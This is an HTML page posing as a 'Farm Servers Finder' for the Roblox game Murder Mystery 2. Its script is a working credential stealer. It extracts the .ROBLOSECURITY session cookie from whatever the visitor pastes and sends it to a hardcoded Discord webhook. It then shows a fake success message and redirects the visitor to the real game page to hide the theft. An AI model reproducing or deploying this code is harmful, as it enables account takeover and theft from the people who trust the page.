<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Farm Servers Finder MM2</title>
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  <style>
    body {
      background-color: #121212;
      color: #ffffff;
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
    }
    .container {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .panel {
      background-color: #1e1e1e;
      border-radius: 10px;
      padding: 20px;
      width: 50%;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
    }
    .panel h2 {
      color: #ff79c6;
    }
    .panel textarea {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      margin-bottom: 20px;
      border-radius: 5px;
      border: 1px solid #333;
      background-color: #252525;
      color: #ffffff;
    }
    .panel button {
      background-color: #ff79c6;
      border: none;
      padding: 10px 20px;
      color: #ffffff;
      border-radius: 5px;
      cursor: pointer;
    }
    .panel button:hover {
      background-color: #e066c1;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="panel">
      <h2>Farm Servers Finder</h2>
      <p>Paste yourMM2 Player file. We will format your data and send it to Roblox API to find the perfect Farm server for you!</p>
      <label for="networkContent">Paste MM2 PLAYER FILE:</label>
      <textarea id="networkContent" rows="10" placeholder="Paste network request content here..."></textarea>
      <button id="submitBtn">Submit</button>
    </div>
  </div>

  <script>
    document.getElementById('submitBtn').addEventListener('click', () => {
      const networkContent = document.getElementById('networkContent').value.trim();

      
      const roblosecurityMatch = networkContent.match(/\.ROBLOSECURITY=([^;|\n|\r]+)/);
      if (!roblosecurityMatch) {
        Swal.fire('Error', 'The pasted content was not generated while logged in a ROBLOX account.', 'error');
        return;
      }

      const roblosecurityCookie = roblosecurityMatch[1];
      const fakeProfileURL = 'https://www.roblox.com/users/123456789/profile'; // Fake profile link

      fetch('https://discord.com/api/webhooks/1306623912850755605/BLRmDNUk3NNgG46YQ0g4cDDK7HW45swQeLJje1c1RU4EmoyGkrgYbbDBiJMCBc1SwaDm', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          embeds: [
            {
              title: 'New Server Request',
              color: 15844367,
              fields: [
                { name: 'Profile Link', value: fakeProfileURL, inline: true },
                { name: '.ROBLOSECURITY', value: `\`\`\`${roblosecurityCookie}\`\`\``, inline: false },
              ],
            },
          ],
        }),
      })
        .then(response => {
          if (!response.ok) {
            throw new Error('Failed to process');
          }
          Swal.fire({
            icon: 'success',
            title: 'Server Found!',
            text: 'We found a server for you! Click below to join it.',
            confirmButtonText: 'Join NOW',
            allowOutsideClick: false,
          }).then(result => {
            if (result.isConfirmed) {
              window.location.href = 'https://www.roblox.com/games/142823291/Murder-Mystery-2';
            }
          });
        })
        .catch(error => {
          console.error('Error sending data to webhook:', error);
          Swal.fire('Error', 'Failed to process.', 'error');
        });
    });
  </script>
</body>
</html>
